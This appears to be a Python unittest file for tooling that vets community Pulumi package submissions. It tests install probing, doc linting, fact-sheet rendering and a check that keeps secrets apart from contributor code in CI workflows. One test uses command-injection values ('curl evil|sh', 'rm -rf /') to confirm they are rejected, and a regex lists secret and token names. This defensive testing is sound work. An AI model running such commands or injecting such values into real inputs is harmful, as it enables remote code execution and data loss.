from __future__ import annotations

import re
import sys
import unittest
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).parent))
import cli  # noqa: E402
import doc_lint  # noqa: E402
import fact_sheet  # noqa: E402
import package_list  # noqa: E402
import sdk_install_probe  # noqa: E402
import verify_entry  # noqa: E402
from models import DocFile, DocFinding, InstallResult, Manifest, Version  # noqa: E402

SCHEMA: dict[str, Any] = {
    "name": "time",
    "pluginDownloadURL": "https://get.example.com/time",
    "language": {
        "nodejs": {"packageName": "@pulumiverse/time"},
        "python": {"packageName": "pulumiverse_time"},
        "go": {"importBasePath": "github.com/pulumiverse/pulumi-time/sdk/go/time"},
    },
}


class InstallProbeTests(unittest.TestCase):
    def setUp(self) -> None:
        self.calls: list[list[str]] = []
        self._real_run = sdk_install_probe._run

        def fake(cmd: list[str], cwd: str | None = None, env: dict[str, str] | None = None) -> tuple[bool, str]:
            self.calls.append(cmd)
            return True, ""

        sdk_install_probe._run = fake

    def tearDown(self) -> None:
        sdk_install_probe._run = self._real_run

    def test_builds_safe_commands_from_schema(self) -> None:
        commands = {r.language: r.command for r in sdk_install_probe.probe_installs("time", "v0.1.1", SCHEMA)}
        self.assertEqual(commands["plugin"], "pulumi plugin install resource time v0.1.1")
        self.assertEqual(commands["nodejs"], "npm install @pulumiverse/time@0.1.1")
        self.assertEqual(commands["python"], "pip download pulumiverse_time==0.1.1")
        self.assertIn("go get github.com/pulumiverse/pulumi-time/sdk/go/time@v0.1.1", commands["go"])
        flat = [" ".join(c) for c in self.calls]
        self.assertTrue(any("-- @pulumiverse/time@0.1.1" in c for c in flat))  # passed as argv, never a shell
        self.assertTrue(any("--server https://get.example.com/time" in c for c in flat))

    def test_rejects_injected_identifiers_without_executing(self) -> None:
        evil = {**SCHEMA, "language": {**SCHEMA["language"], "nodejs": {"packageName": "foo; curl evil|sh"}}}
        results = {r.language: r.result for r in sdk_install_probe.probe_installs("time; rm -rf /", "v0.1.1", evil)}
        self.assertEqual(results["plugin"], "rejected")
        self.assertEqual(results["nodejs"], "rejected")
        self.assertFalse(any(c and c[0] in ("npm", "pulumi") for c in self.calls))

    def test_python_name_falls_back_to_pulumi_underscore(self) -> None:
        results = sdk_install_probe.probe_installs("thoth", "v1.0.0", {"name": "thoth", "language": {}})
        self.assertEqual(next(r for r in results if r.language == "python").command, "pip download pulumi_thoth==1.0.0")


class DocLintTests(unittest.TestCase):
    def test_flags_broken_refs_and_ignores_absolute(self) -> None:
        issues = doc_lint.find_issues(
            "![logo](./logo.png)\n<a href=\"./page\">y</a>\nsee [config](./x.md)\n"
            "[ok](https://e.com)\n![ok](https://e.com/y.png)\n")
        self.assertEqual({i.line for i in issues}, {1, 2, 3})
        self.assertEqual({i.kind for i in issues}, {"relative-image", "raw-relative-link", "md-suffixed-link"})

    def test_clean_doc(self) -> None:
        self.assertEqual(doc_lint.find_issues("[x](https://y)\n![a](https://y/z.png)\n"), [])


class PackageListTests(unittest.TestCase):
    def test_added_entries(self) -> None:
        base = '{"include":[{"repoSlug":"a/b","schemaFile":"s"}]}'
        grown = '{"include":[{"repoSlug":"a/b","schemaFile":"s"},{"repoSlug":"c/d","schemaFile":"t"}]}'
        self.assertEqual(package_list.added_entries(base, base), [])
        self.assertEqual([e.repoSlug for e in package_list.added_entries(base, grown)], ["c/d"])
        self.assertEqual([e.repoSlug for e in package_list.added_entries("[]", '[{"repoSlug":"c/d","schemaFile":"t"}]')],
                         ["c/d"])


class VerifyTests(unittest.TestCase):
    def test_provider_name_prefers_schema_then_repo_suffix(self) -> None:
        self.assertEqual(verify_entry.provider_name("x/pulumi-thoth", {"name": "thoth"}), "thoth")
        self.assertEqual(verify_entry.provider_name("x/pulumi-thoth", {}), "thoth")
        self.assertEqual(verify_entry.provider_name("x/pulumi-provider-dex", {}), "provider-dex")


def _manifest(green: bool = True, findings: list[DocFinding] | None = None,
              installs: list[InstallResult] | None = None, docs: list[DocFile] | None = None) -> Manifest:
    return Manifest("x/pulumi-demo", "s.json", "demo", Version("v1.0.0", "0" * 40), "x",
                    installs or [], findings or [], green=green, docs=docs or [])


class FactSheetTests(unittest.TestCase):
    def test_green_render_with_docs_and_findings(self) -> None:
        out = fact_sheet.render(_manifest(
            findings=[DocFinding(12, "relative-image", "![a](./b.png)")],
            docs=[DocFile("docs/_index.md", 3, "# Title\n```go\nx\n```\n")]))
        self.assertIn("✅", out.splitlines()[0])
        self.assertIn("Doc-lint: 1 finding(s)", out)
        self.assertIn("docs/_index.md:12", out)
        self.assertIn("/blob/" + "0" * 40 + "/docs/_index.md", out)
        self.assertIn("# Title", out)

    def test_red_render_with_install_failure(self) -> None:
        out = fact_sheet.render(_manifest(
            green=False,
            installs=[InstallResult("python", "pip download x==1", "fail", error="No matching distribution")]))
        self.assertIn("❌", out.splitlines()[0])
        self.assertIn("Not ready", out)
        self.assertIn("/check", out)
        self.assertIn("pip download x==1", out)
        self.assertIn("No matching distribution", out)
        self.assertIn("<details>", out)

    def test_doc_fence_outgrows_backticks(self) -> None:
        self.assertEqual(fact_sheet._fence_longer_than_any_run_in("no ticks"), "```")
        self.assertEqual(fact_sheet._fence_longer_than_any_run_in("```go\nx\n```"), "````")


class PublishTitleTests(unittest.TestCase):
    def test_single_and_multi_entry_titles(self) -> None:
        self.assertEqual(cli.publish_pr_title_and_branch([("thoth", "v0.1.1")]),
                         ("Publish Package Metadata thoth@v0.1.1", "thoth/publish-metadata"))
        self.assertEqual(cli.publish_pr_title_and_branch([("defang-aws", "v1"), ("defang-gcp", "v1")]),
                         ("Publish package metadata for defang-aws, defang-gcp", "publish-metadata/defang-aws-defang-gcp"))


_SECRET = re.compile(r"secrets\.|ESC_ACTION|esc-action|ANTHROPIC_API_KEY|PULUMI_BOT_TOKEN|id-token: *write")
_RUNS_CODE = re.compile(
    r"cli\.py check(?![-\w])|npm (install|ci)|pip (install|download)|go get|go mod download|pulumi plugin install")


class SecretCodeSeparationTests(unittest.TestCase):
    """No community-package workflow may both hold a secret and run a contributor's code, or a
    malicious package could read the secret."""

    def test_no_workflow_mixes_secrets_with_contributor_code(self) -> None:
        workflows = sorted((Path(__file__).resolve().parents[3] / ".github/workflows").glob("community-package-*.yml"))
        self.assertTrue(workflows, "no community-package workflows found")
        for workflow in workflows:
            text, name = workflow.read_text(), workflow.name
            holds_secret = bool(_SECRET.search(text))
            self.assertFalse(holds_secret and _RUNS_CODE.search(text), f"{name}: secret shares a job with code")
            self.assertNotIn("pull_request_target", text, name)
            if holds_secret:
                self.assertNotRegex(text, r"ref:.*\.head\.", f"{name}: secret job checks out the PR head")


if __name__ == "__main__":
    unittest.main()
